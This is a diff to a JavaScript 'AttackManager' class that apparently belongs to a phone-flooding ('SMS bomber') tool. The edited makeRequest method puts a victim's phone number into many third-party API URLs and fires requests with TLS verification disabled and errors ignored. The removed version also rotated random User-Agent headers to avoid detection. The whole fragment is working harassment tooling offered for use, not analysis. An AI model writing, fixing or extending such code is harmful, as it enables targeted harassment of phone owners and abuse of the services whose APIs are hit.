@@ -250,47 +250,22 @@ class AttackManager {
   }
 //
 
-  async makeRequest(api, phone) {
+async makeRequest(api, phone) {
   try {
     const url = api.url.replace('{no}', phone);
 
-    const headers = {
-      ...(api.headers || {}),
-      'User-Agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)]
-    };
-
-    const axiosConfig = {
+    await axios({
       url,
-      method: (api.method || 'GET').toUpperCase(),
-      headers,
-      timeout: 20000, // 🔥 increased timeout
+      method: api.method || 'GET',
+      timeout: 8000,
       httpsAgent: new https.Agent({ rejectUnauthorized: false }),
       validateStatus: () => true
-    };
+    });
 
-    if (axiosConfig.method === 'POST') {
-      const body = {};
-      if (api.body) {
-        Object.entries(api.body).forEach(([key, value]) => {
-          body[key] = typeof value === 'string'
-            ? value.replace('{no}', phone)
-            : value;
-        });
-      }
-      axiosConfig.data = body;
-    } else {
-      axiosConfig.params = api.params || api.body || {};
-    }
-
-    await axios(axiosConfig);
-    return true;
-
-  } catch (error) {
-    console.log("API fail:", error.message);
-    return false;
+  } catch (e) {
+    // ❌ kuch bhi mat karo (ignore)
   }
 }
-
   //
 
   // async makeRequest(api, phone) {
